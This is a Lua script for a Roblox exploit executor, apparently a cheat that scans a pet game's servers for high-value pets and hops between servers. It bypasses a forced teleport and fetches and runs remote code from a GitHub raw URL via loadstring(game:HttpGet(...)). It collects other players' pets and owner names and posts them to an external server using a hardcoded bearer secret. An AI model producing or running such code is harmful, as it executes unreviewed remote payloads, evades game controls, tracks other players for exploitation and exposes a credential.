-- Teleport Bypass Loader
-- Execute IMMEDIATELY - don't wait for game to load
local tpService = cloneref(game:GetService("TeleportService"))
tpService:SetTeleportGui(tpService)
print("‚úÖ [BYPASS] TeleportGui set IMMEDIATELY - bypass active!")

-- Now wait for game to load
repeat wait() until game:IsLoaded()

local logService = cloneref(game:GetService("LogService"))
-- Wait for the error to appear (this means game tried to teleport)
local stoppedTp = false
local startTime = tick()
local maxWaitTime = 6
while not stoppedTp and (tick() - startTime) < maxWaitTime do
    for i,v in logService:GetLogHistory() do
        if v.message:find("cannot be cloned") then
            stoppedTp = true
            break
        end
    end
    task.wait(0.05)
end
-- Now cancel it
tpService:TeleportCancel()
tpService:SetTeleportGui(nil)
if stoppedTp then
else
end
wait(0.3)
local success, result = pcall(function()
    return loadstring(game:HttpGet("https://raw.githubusercontent.com/luxars/luxarwork/refs/heads/main/work.lua"))()
end)
if success then
    print("[LOADER] Worker script loaded and executed successfully!")
else
    warn("[LOADER] Failed to load worker script: " .. tostring(result))
end

setfpscap(10)

local function safeGetService(serviceName)
    local success, service = pcall(function()
        return game:GetService(serviceName)
    end)
    return success and service or nil
end

-- Services
local Players = game:GetService("Players")
local RS = game:GetService("ReplicatedStorage")
local Workspace = game:GetService("Workspace")
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")
local VIM = game:GetService("VirtualInputManager")
local TweenService = game:GetService("TweenService")
local CoreGui = safeGetService("CoreGui")
local UserInputService = game:GetService("UserInputService")
local RunService = game:GetService("RunService")

-- Wait for game to load
repeat task.wait() until game:IsLoaded()

-- Wait for player to load
print("[LOADING] Waiting for player...")
local player = Players.LocalPlayer
while not player do
    task.wait(0.1)
    player = Players.LocalPlayer
end
print("[LOADING] Player found:", player.Name)

-- ============================================
-- PET FINDER SYSTEM (Server Scanner & Hopper)
-- ============================================
print("[PET FINDER] Starting pet finder mode...")

getgenv().PetFinderSettings = getgenv().PetFinderSettings or {}
local Settings = getgenv().PetFinderSettings

-- API Configuration
local http_request = (syn and syn.request) or (http and http.request) or http_request or (fluxus and fluxus.request) or request
if not http_request then
    warn("[PET FINDER] ERROR: Your executor doesn't support HTTP requests!")
end

local VPS_URL = "https://joiner-production-f4f0.up.railway.app"
local API_SECRET = "zXw7tKAm4vQjaz0cALWtmLM6j6sEBdT71Sml9liC6VQOws4iSwJQSRMfVptDeXxq"
local VPS_PLACE_ID = 109983668079237
local USERNAME = Players.LocalPlayer.Name

ServerCacheFileName = "server_cache.json"
HopSettings = { sortOrder = "Asc", minPlayers = 1 }
ApiState = { cachedServers = {}, mainApiUses = 0, lastCacheUpdate = 0 }
AllowedPlaceId = game.PlaceId
RetryDelaySeconds = 3
VisitedServersMap = {}
VisitedServersCount = 0

function SaveServerCache()
    pcall(function()
        writefile(ServerCacheFileName, HttpService:JSONEncode(ApiState))
    end)
end

function LoadServerCache()
    IsSuccess, CacheData = pcall(function()
        return readfile(ServerCacheFileName)
    end)
    if not IsSuccess or not CacheData or CacheData == "" then
        ApiState = { cachedServers = {}, mainApiUses = 0, lastCacheUpdate = 0 }
        SaveServerCache()
        return
    end
    DecodeSuccess, DecodedData = pcall(function()
        return HttpService:JSONDecode(CacheData)
    end)
    if not DecodeSuccess or type(DecodedData) ~= "table" then
        ApiState = { cachedServers = {}, mainApiUses = 0, lastCacheUpdate = 0 }
        SaveServerCache()
        return
    end
    ApiState = DecodedData
    if #ApiState.cachedServers > 500 then
        TrimmedCache = {}
        for Index = #ApiState.cachedServers - 300, #ApiState.cachedServers do
            if ApiState.cachedServers[Index] then
                table.insert(TrimmedCache, ApiState.cachedServers[Index])
            end
        end
        ApiState.cachedServers = TrimmedCache
        SaveServerCache()
    end
end

function GetCachedServersList()
    ServersList = {}
    CurrentJobId = game.JobId
    for _, ServerId in ipairs(ApiState.cachedServers) do
        if ServerId ~= CurrentJobId and not VisitedServersMap[ServerId] then
            table.insert(ServersList, ServerId)
        end
    end
    return ServersList
end

function FetchServersFromApi()
    ServersList = {}
    CursorToken = ""
    CurrentJobId = game.JobId
    for PageIndex = 1, 3 do
        ApiUrl = "https://games.roblox.com/v1/games/" .. AllowedPlaceId .. "/servers/Public?sortOrder=" .. HopSettings.sortOrder .. "&limit=100&excludeFullGames=true"
        if CursorToken ~= "" then
            ApiUrl = ApiUrl .. "&cursor=" .. CursorToken
        end
        FetchSuccess, ResponseData = pcall(function()
            return game:HttpGet(ApiUrl)
        end)
        if not FetchSuccess then break end
        ResponseBody = HttpService:JSONDecode(ResponseData)
        if not ResponseBody.data then break end
        for _, ServerInfo in ipairs(ResponseBody.data) do
            if ServerInfo.playing < ServerInfo.maxPlayers and ServerInfo.id ~= CurrentJobId and not VisitedServersMap[ServerInfo.id] then
                table.insert(ServersList, ServerInfo.id)
                if not VisitedServersMap[ServerInfo.id] then
                    table.insert(ApiState.cachedServers, ServerInfo.id)
                end
            end
        end
        CursorToken = ResponseBody.nextPageCursor or ""
        if CursorToken == "" then break end
    end
    ApiState.lastCacheUpdate = os.time()
    SaveServerCache()
    return ServersList
end

function GetAvailableServersList()
    ServersList = FetchServersFromApi()
    if #ServersList == 0 then
        return GetCachedServersList()
    end
    return ServersList
end

-- ===============================
-- API Communication
-- ===============================
local function sendToAPI(brainrotData, serverId, playerCount, maxPlayers)
    if not http_request then
        warn("[PET FINDER] Cannot send to API: HTTP request not available")
        return false
    end
    
    print("üì§ [PET FINDER] API'ye veri g√∂nderiliyor - JobID: " .. serverId .. ", Brainrot sayƒ±sƒ±: " .. #brainrotData)
    local success, response = pcall(function()
        local headers = {
            ["Authorization"] = "Bearer " .. API_SECRET,
            ["Content-Type"] = "application/json"
        }
        
        local payload = {
            brainrots = brainrotData,
            server_id = serverId,
            player_count = playerCount,
            max_players = maxPlayers
        }
        
        local body = HttpService:JSONEncode(payload)
        
        local result = http_request({
            Url = VPS_URL .. "/notify",
            Method = "POST",
            Headers = headers,
            Body = body
        })
        
        if result and result.StatusCode == 200 then
            print("‚úÖ [PET FINDER] API'ye veri g√∂nderildi - Status: " .. result.StatusCode)
            return true
        else
            print("‚ùå [PET FINDER] API yanƒ±t hatasƒ± - Status: " .. (result and result.StatusCode or "nil"))
            return false
        end
    end)
    
    if not success then
        print("‚ùå [PET FINDER] API √ßaƒürƒ±sƒ± hatasƒ±: " .. tostring(response))
    end
    
    return success and response
end

-- ===============================
-- JobID Fetching from Server
-- ===============================
local function getJobsFromFetcher()
    local ok, result = pcall(function()
        local headers = {
            ["Authorization"] = "Bearer " .. API_SECRET,
            ["Content-Type"] = "application/json"
        }
        
        local payload = { username = USERNAME, count = 1 }
        local body = HttpService:JSONEncode(payload)
        
        local response = http_request({
            Url = VPS_URL .. "/get_jobs",
            Method = "POST",
            Headers = headers,
            Body = body
        })
        
        if response and response.StatusCode == 200 and response.Body then
            local decoded = HttpService:JSONDecode(response.Body)
            if decoded.status == "ok" then
                return decoded.jobs or {}
            end
        end
        return nil
    end)
    
    if ok and result then return result end
    return nil
end

-- ===============================
-- Utility Functions for Pet Scanning
-- ===============================
repeat task.wait() until Workspace:FindFirstChild("Plots")

local function parseGeneration(b)
    if not b:find("/s") then return 0 end
    b = b:gsub("%$", ""):gsub("/s", ""):gsub("%s+", "")
    local c = 1
    if b:find("[Kk]") then
        c = 1e3
        b = b:gsub("[Kk]", "")
    elseif b:find("[Mm]") then
        c = 1e6
        b = b:gsub("[Mm]", "")
    elseif b:find("[Bb]") then
        c = 1e9
        b = b:gsub("[Bb]", "")
    elseif b:find("[Tt]") then
        c = 1e12
        b = b:gsub("[Tt]", "")
    end
    return tonumber(b) and tonumber(b) * c or 0
end

local function getOwnerFromPlot(genLabel)
    -- Try to find the plot that contains this generation label
    local current = genLabel
    while current and current ~= Workspace do
        if current.Parent and current.Parent.Name == "Plots" then
            -- Found a plot, try to get owner
            local plot = current
            local success, result = pcall(function()
                if plot:FindFirstChild('Owner') then
                    local owner = plot.Owner
                    if owner:IsA('StringValue') or owner:IsA('ObjectValue') then
                        return owner.Value
                    end
                end
                local ownerAttr = plot:GetAttribute('Owner')
                if ownerAttr then return ownerAttr end
                if plot:FindFirstChild('OwnerName') then
                    local ownerName = plot.OwnerName
                    if ownerName:IsA('StringValue') then return ownerName.Value end
                end
                local ownerNameAttr = plot:GetAttribute('OwnerName')
                if ownerNameAttr then return ownerNameAttr end
                -- Try to get from plot sign
                local sign = plot:FindFirstChild("PlotSign")
                if sign then
                    local gui = sign:FindFirstChild("SurfaceGui")
                    local frame = gui and gui:FindFirstChild("Frame")
                    local label = frame and frame:FindFirstChild("TextLabel")
                    if label and label.Text then
                        local displayName = label.Text:gsub("'s Base", "")
                        -- Try to match with online players
                        for _, player in pairs(Players:GetPlayers()) do
                            if player.DisplayName == displayName then return player.Name end
                        end
                        return displayName
                    end
                end
                return "Unknown"
            end)
            if success and result then return result end
        end
        current = current.Parent
    end
    return "Unknown"
end

-- ===============================
-- Scanning Logic
-- ===============================
local function scanAllPlots()
    local allBrainrots = {}
    
    print("üîç [DEBUG] Petler taranƒ±yor...")
    
    for _, f in pairs(Workspace:GetDescendants()) do
        if f:IsA("TextLabel") and f.Name == "Generation" then
            local g = parseGeneration(f.Text)
            if g >= 1e6 then
                local h, i, j = "Unknown", "Unknown", "None"
                local k = f.Parent
                if k then
                    local l = k:FindFirstChild("DisplayName")
                    if l and l:IsA("TextLabel") then h = l.Text end
                    local m = k:FindFirstChild("Rarity")
                    if m and m:IsA("TextLabel") then i = m.Text end
                    local n = k:FindFirstChild("Mutation")
                    if n and n.Visible then j = n.Text end
                end
                
                -- Get owner from plot structure
                local owner = getOwnerFromPlot(f)
                
                table.insert(allBrainrots, {
                    name = h,
                    generation = f.Text,
                    owner = owner,
                    count = 1,
                    genNum = g,
                    rarity = i,
                    mutation = j
                })
            end
        end
    end
    
    table.sort(allBrainrots, function(a, b)
        return a.genNum > b.genNum
    end)
    
    for _, brainrot in ipairs(allBrainrots) do
        brainrot.genNum = nil
    end
    
    print("‚úÖ [DEBUG] Tarama tamamlandƒ± - Toplam " .. #allBrainrots .. " brainrot bulundu")
    return allBrainrots
end

LoadServerCache()

print("[PET FINDER] Starting scan loop...")

-- Wait for game to fully load before starting
task.spawn(function()
    print("‚è≥ [PET FINDER] Oyun y√ºkleniyor...")
    repeat task.wait() until game:IsLoaded()
    print("‚è≥ [PET FINDER] Oyuncu karakteri bekleniyor...")
    repeat task.wait() until Players.LocalPlayer and Players.LocalPlayer.Character
    print("‚è≥ [PET FINDER] Plots bekleniyor...")
    repeat task.wait() until Workspace and Workspace:FindFirstChild("Plots")
    
    task.wait(math.random(3, 8) / 10)
    
    local scanComplete = false
    
    -- Scan task - scans and sends to API
    task.spawn(function()
        print("üîç [PET FINDER] Scan task ba≈ülatƒ±ldƒ±")
        pcall(function()
            -- Cache jobID directly
            local serverId = game.JobId
            print("üìå [PET FINDER] Mevcut sunucu JobID: " .. serverId)
            
            task.wait(0.5)
            
            print("üîç [PET FINDER] Plotlar taranƒ±yor...")
            local brainrots = scanAllPlots()
            print("‚úÖ [PET FINDER] Tarama tamamlandƒ± - Bulunan brainrot sayƒ±sƒ±: " .. #brainrots)
            
            if #brainrots > 0 then
                print("[PET FINDER] Found " .. #brainrots .. " high-value pets")
                for _, brainrot in ipairs(brainrots) do
                    print(string.format("[PET FINDER] - %s (Gen: %s, Owner: %s)", 
                        brainrot.name, brainrot.generation, brainrot.owner))
                end
                
                -- Send to API
                local playerCount = #Players:GetPlayers()
                local maxPlayers = Players.MaxPlayers
                print("üë• [PET FINDER] Oyuncu sayƒ±sƒ±: " .. playerCount .. "/" .. maxPlayers)
                sendToAPI(brainrots, serverId, playerCount, maxPlayers)
            else
                print("‚ÑπÔ∏è [PET FINDER] Brainrot bulunamadƒ±, API'ye veri g√∂nderilmedi")
            end
        end)
        
        scanComplete = true
        print("‚úÖ [PET FINDER] Scan task tamamlandƒ±")
    end)
    
    -- Hop task - waits for scan to complete, then hops
    task.spawn(function()
        print("üöÄ [PET FINDER] Hop task ba≈ülatƒ±ldƒ±")
        
        print("‚è≥ [PET FINDER] Scan task'in bitmesi bekleniyor...")
        local waitTime = 0
        while not scanComplete and waitTime < 10 do
            task.wait(0.5)
            waitTime = waitTime + 0.5
        end
        print("‚úÖ [PET FINDER] Hop task ba≈ülƒ±yor...")
        
        -- Server hop using getJobsFromFetcher (jobID from server)
        while true do
            local jobs = getJobsFromFetcher()
            
            if not jobs or #jobs == 0 then
                task.wait(0.5)
            else
                print("üì• Received " .. tostring(#jobs) .. " servers")
                
                for i = 1, #jobs do
                    local server = jobs[i]
                    
                    if server.id and #server.id >= 30 and server.id ~= game.JobId then
                        local success, err = pcall(function()
                            TeleportService:TeleportToPlaceInstance(VPS_PLACE_ID, server.id, Players.LocalPlayer)
                        end)
                        
                        if success then
                            task.wait(0.2)
                            break
                        end
                        
                        task.wait(0.15)
                    end
                end
                
                task.wait(0.3)
            end
        end
    end)
end)

TeleportService.TeleportInitFailed:Connect(function(player, result, errorMessage, placeId, teleportOptions)
    -- Silent error handling
end)
